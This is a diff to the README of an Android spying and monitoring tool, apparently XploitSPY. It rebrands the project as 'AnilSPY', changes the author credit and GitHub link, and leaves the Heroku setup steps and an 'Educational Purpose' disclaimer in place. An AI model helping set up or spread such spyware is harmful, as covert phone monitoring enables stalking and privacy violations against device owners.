@@ -38,7 +38,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 
 5. It will download Latest codes for you in your PC
     
-6. Now change the directory to XploitSPY using command `cd XploitSPY`
+6. Now change the directory to AnilSPY using command `cd anilspy
 
 7. Now Login into Heroku CLI using command `heroku login -i` now enter your login details and hit Enter
 
@@ -57,5 +57,5 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 XploitSPY is built for Educational Purpose. Use at your own Risk.</b>
 
 <br>
-<p align="center">Made with ❤️ By <a href="https://github.com/vikashmobileclinic/AndroidSpyServer/">Mr.Chauhan</a></p>
+<p align="center">Made with ❤️ By <a href="https://github.com/anilje8930/Anilspy/">Anil Rajput</a></p>
 
